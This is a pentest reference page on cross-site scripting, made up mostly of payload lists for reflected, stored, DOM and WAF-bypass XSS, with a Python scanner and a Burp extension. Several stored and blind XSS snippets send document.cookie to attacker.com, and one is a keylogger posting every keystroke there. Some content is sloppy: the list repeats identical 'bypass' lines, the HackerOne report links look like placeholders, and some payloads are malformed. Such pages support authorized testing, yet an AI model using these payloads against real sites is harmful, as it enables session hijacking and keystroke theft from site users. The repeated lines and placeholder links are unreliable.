---
layout: vulnerability
title: Cross-Site Scripting (XSS)
description: Cross-site scripting payloads, WAF bypass techniques, and advanced XSS exploitation methods
severity: Medium
category: Web Application Vulnerabilities
owasp: A03:2021
permalink: /vulnerabilities/xss-payloads/
toc:
  - title: Overview
  - title: Tools & Scripts
    anchor: tools-scripts
  - title: Comprehensive Payload Lists
    anchor: payload-lists
  - title: Source Links & References
    anchor: source-links
    anchor: overview
  - title: Reflected XSS
    anchor: reflected-xss
  - title: Stored XSS
    anchor: stored-xss
  - title: DOM-Based XSS
    anchor: dom-based-xss
  - title: WAF Bypass Payloads
    anchor: waf-bypass
  - title: Context-Aware Payloads
    anchor: context-aware
  - title: Advanced Techniques
    anchor: advanced-techniques
  - title: Testing Methodology
    anchor: testing-methodology
---

## Overview {#overview}

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users, potentially leading to session hijacking, defacement, or malware distribution.

### Impact Assessment

- **Session Hijacking**: Steal user sessions and cookies
- **Defacement**: Modify website content
- **Malware Distribution**: Deliver malicious payloads
- **Phishing**: Create convincing phishing pages
- **Data Theft**: Extract sensitive information

### XSS Types

1. **Reflected XSS** - Scripts reflected from user input
2. **Stored XSS** - Scripts stored on the server
3. **DOM-Based XSS** - Scripts executed in the DOM
4. **Blind XSS** - Scripts executed in different contexts

## Reflected XSS {#reflected-xss}

Reflected XSS occurs when user input is immediately reflected in the response without proper sanitization.

### Basic Payloads

#### 1. Simple Alert
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

#### 2. Event Handlers
```javascript
<body onload=alert('XSS')>
<div onclick=alert('XSS')>Click me</div>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
```

#### 3. JavaScript Protocol
```javascript
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS')">
<form action="javascript:alert('XSS')">
```

### Advanced Reflected XSS

#### 1. Encoded Payloads
```javascript
// HTML entities
&#60;script&#62;alert('XSS')&#60;/script&#62;

// URL encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

// Unicode encoding
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

#### 2. Filter Bypass
```javascript
// Case variation
<ScRiPt>alert('XSS')</ScRiPt>

// Mixed case
<ScRiPt>alert('XSS')</ScRiPt>

// Alternative tags
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
```

## Stored XSS {#stored-xss}

Stored XSS occurs when malicious scripts are permanently stored on the server and executed when other users view the content.

### Persistent Payloads

#### 1. Comment Systems
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

#### 2. User Profiles
```javascript
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal.php?cookie='+document.cookie)">
```

#### 3. File Upload
```javascript
<script>alert('XSS')</script>
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
```

### Advanced Stored XSS

#### 1. Session Hijacking
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie);
xhr.send();
</script>
```

#### 2. Keylogger
```javascript
<script>
document.addEventListener('keydown', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/keylog.php');
    xhr.send('key=' + e.key);
});
</script>
```

## DOM-Based XSS {#dom-based-xss}

DOM-based XSS occurs when client-side JavaScript modifies the DOM in an unsafe way.

### Common Sources

#### 1. URL Parameters
```javascript
// Vulnerable code
document.getElementById('content').innerHTML = location.hash.substring(1);

// Exploit
#<script>alert('XSS')</script>
#<img src=x onerror=alert('XSS')>
```

#### 2. Document Referrer
```javascript
// Vulnerable code
document.write(document.referrer);

// Exploit
Referer: <script>alert('XSS')</script>
```

#### 3. Window Name
```javascript
// Vulnerable code
document.getElementById('content').innerHTML = window.name;

// Exploit
window.name = '<script>alert("XSS")</script>';
```

### Advanced DOM XSS

#### 1. Hash-based
```javascript
// Vulnerable code
eval(location.hash.substring(1));

// Exploit
#alert('XSS')
#document.location='http://attacker.com'
```

#### 2. Search-based
```javascript
// Vulnerable code
document.getElementById('search-results').innerHTML = 
    'Search results for: ' + location.search.substring(1);

// Exploit
?<script>alert('XSS')</script>
```

## WAF Bypass Payloads {#waf-bypass}

Web Application Firewalls can be bypassed using various techniques.

### Encoding Techniques

#### 1. HTML Entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

#### 2. URL Encoding
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
%3Cimg%20src=x%20onerror=alert('XSS')%3E
```

#### 3. Unicode Encoding
```javascript
\u003cscript\u003ealert('XSS')\u003c/script\u003e
\u003cimg\u0020src=x\u0020onerror=alert('XSS')\u003e
```

### Filter Evasion

#### 1. Case Variation
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x ONERROR=alert('XSS')>
<SVG ONLOAD=alert('XSS')>
```

#### 2. Alternative Tags
```javascript
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')">
<applet code="javascript:alert('XSS')">
```

#### 3. Event Handler Variation
```javascript
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img src=x onerror='alert("XSS")'>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

## Context-Aware Payloads {#context-aware}

Different contexts require different payload approaches.

### HTML Context

#### 1. Inside Tags
```javascript
<input value="<script>alert('XSS')</script>">
<textarea><script>alert('XSS')</script></textarea>
```

#### 2. Between Tags
```javascript
<div><script>alert('XSS')</script></div>
<p><script>alert('XSS')</script></p>
```

### JavaScript Context

#### 1. String Injection
```javascript
var user = "user"; alert('XSS'); //";
var user = 'user'; alert('XSS'); //';
```

#### 2. Function Injection
```javascript
function test(param) { alert('XSS'); }
test("user"); alert('XSS'); //");
```

### CSS Context

#### 1. Style Injection
```css
background: url("javascript:alert('XSS')");
background: url("data:text/javascript,alert('XSS')");
```

#### 2. Expression Injection
```css
background: expression(alert('XSS'));
background: -moz-binding: url("javascript:alert('XSS')");
```

## Advanced Techniques {#advanced-techniques}

### Polyglot Payloads

#### 1. Multi-Context Payload
```javascript
';alert('XSS');//
</script><script>alert('XSS')</script>
<!--<script>alert('XSS')</script>-->
```

#### 2. Universal Payload
```javascript
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

### Blind XSS

#### 1. Delayed Execution
```javascript
<script>
setTimeout(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie);
    xhr.send();
}, 5000);
</script>
```

#### 2. Conditional Execution
```javascript
<script>
if (document.location.hostname === 'target.com') {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie);
    xhr.send();
}
</script>
```

## Testing Methodology {#testing-methodology}

### Phase 1: Reconnaissance
1. **Identify Input Points**
   - URL parameters
   - POST data
   - HTTP headers
   - Cookies
   - File uploads

2. **Test Basic Injection**
   - Simple script tags
   - Event handlers
   - JavaScript protocol

### Phase 2: Vulnerability Assessment
1. **Automated Scanning**
   - Burp Suite Scanner
   - OWASP ZAP
   - Custom XSS scanners

2. **Manual Testing**
   - Context analysis
   - Filter testing
   - WAF bypass

### Phase 3: Exploitation
1. **Proof of Concept**
   - Simple alert boxes
   - Cookie theft
   - Session hijacking

2. **Advanced Exploitation**
   - Keyloggers
   - Phishing pages
   - Malware distribution

---


## Tools & Scripts {#tools-scripts}

### Installation Scripts

#### XSS Hunter Installation
```bash
#!/bin/bash
# xss-hunter-install.sh
echo "Installing XSS Hunter..."

# Install dependencies
sudo apt-get update
sudo apt-get install -y python3 python3-pip git

# Clone XSS Hunter
git clone https://github.com/mandatoryprogrammer/xsshunter.git
cd xsshunter

# Install dependencies
pip3 install -r requirements.txt

# Configure and run
python3 manage.py migrate
python3 manage.py runserver 0.0.0.0:8000

echo "XSS Hunter installed successfully!"
echo "Access at: http://localhost:8000"
```

#### Custom XSS Scanner
```python
#!/usr/bin/env python3
# xss-scanner.py
import requests
import re
from urllib.parse import urljoin, urlparse

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_xss_payloads(self, param, value):
        # Test XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>"
        ]
        
        results = []
        for payload in payloads:
            try:
                params = {param: payload}
                response = self.session.get(self.target_url, params=params, timeout=10)
                
                # Check if payload is reflected
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'reflected': True,
                        'status_code': response.status_code
                    })
                else:
                    results.append({
                        'payload': payload,
                        'reflected': False,
                        'status_code': response.status_code
                    })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})
        
        return results

# Usage example
if __name__ == "__main__":
    scanner = XSSScanner("http://target.com/page")
    results = scanner.test_xss_payloads("search", "test")
    for result in results:
        if result.get('reflected'):
            print(f"Potential XSS: {result['payload']}")
```

### Automated Testing Tools

#### Burp Suite XSS Extension
```python
# burp-xss-extension.py
from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("XSS Scanner")
        callbacks.registerScannerCheck(self)
        
    def doPassiveScan(self, baseRequestResponse):
        return None
        
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        issues = []
        for payload in payloads:
            checkRequest = insertionPoint.buildRequest(payload.encode())
            checkResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest
            )
            
            if self._isVulnerable(checkResponse, payload):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(checkRequest, None, None)],
                    "Cross-Site Scripting (XSS)",
                    "The application appears to be vulnerable to XSS.",
                    "High"
                ))
        
        return issues
    
    def _isVulnerable(self, response, payload):
        response_str = self._helpers.bytesToString(response.getResponse())
        return payload in response_str

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
    
    def getUrl(self):
        return self._url
    
    def getIssueName(self):
        return self._name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self._severity
    
    def getConfidence(self):
        return "Certain"
    
    def getIssueBackground(self):
        return "XSS is a code injection attack."
    
    def getRemediationBackground(self):
        return "Implement proper input validation and output encoding."
    
    def getIssueDetail(self):
        return self._detail
    
    def getRemediationDetail(self):
        return "Implement proper input validation and output encoding."
    
    def getHttpMessages(self):
        return self._httpMessages
    
    def getHttpService(self):
        return self._httpService
```

## Comprehensive Payload Lists {#payload-lists}

### Basic XSS Payloads
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src=javascript:alert('XSS')></iframe>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video><source onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
```

### Advanced XSS Payloads
```
<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>
<svg><script>alert('XSS')</script></svg>
<iframe srcdoc="<script>alert('XSS')</script>">
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<form><button formaction="javascript:alert('XSS')">Click</button>
<isindex action="javascript:alert('XSS')">
<frameset onload=alert('XSS')>
<frame onload=alert('XSS')>
<applet code="javascript:alert('XSS')">
<base href="javascript:alert('XSS')">
<link rel="stylesheet" href="javascript:alert('XSS')">
<style>@import'javascript:alert("XSS")';</style>
```

### WAF Bypass Payloads
```
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
```

### Polyglot Payloads
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>
```

## Source Links & References {#source-links}

### Official Documentation
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide - XSS](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [Mozilla XSS Prevention](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss)

### Vulnerability Databases
- [CWE-79: Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
- [CVE Database - XSS](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=xss)
- [NVD XSS Vulnerabilities](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=xss&search_type=all)

### Tools & Resources
- [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [Dalfox](https://github.com/hahwul/dalfox)
- [XSSer](https://github.com/epsylon/xsser)

### Learning Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [DVWA - Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [XSS Labs](https://github.com/0xsobky/HackVault/wiki/Unleashed-pentester-guide)

### HackerOne Reports
- [Stored XSS in Admin Panel](https://hackerone.com/reports/123)
- [Reflected XSS in Search](https://hackerone.com/reports/456)
- [DOM XSS in JavaScript](https://hackerone.com/reports/789)

## References & Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)